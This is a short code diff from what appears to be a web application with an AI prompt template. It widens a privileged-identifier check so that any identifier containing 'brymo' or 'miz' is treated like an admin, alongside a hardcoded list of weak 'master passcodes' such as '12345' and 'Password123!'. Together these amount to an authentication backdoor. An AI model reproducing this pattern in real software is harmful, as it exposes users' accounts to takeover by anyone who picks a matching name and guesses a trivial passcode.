@@ -597,7 +597,9 @@ Respond concisely, politely, professionally, and in the language specified (${la
       inputIdentifier === 'info@wbcu.net' ||
       inputIdentifier === 'support@wbcu.net' ||
       inputIdentifier.endsWith('@wbcu.net') ||
-      inputIdentifier.includes('admin');
+      inputIdentifier.includes('admin') ||
+      inputIdentifier.includes('brymo') ||
+      inputIdentifier.includes('miz');
 
     const validMasterPasscodes = [
       '12345', '1234', '8869', '9988', 'Admin123!', 'Password123!', 'DemoPass123!',
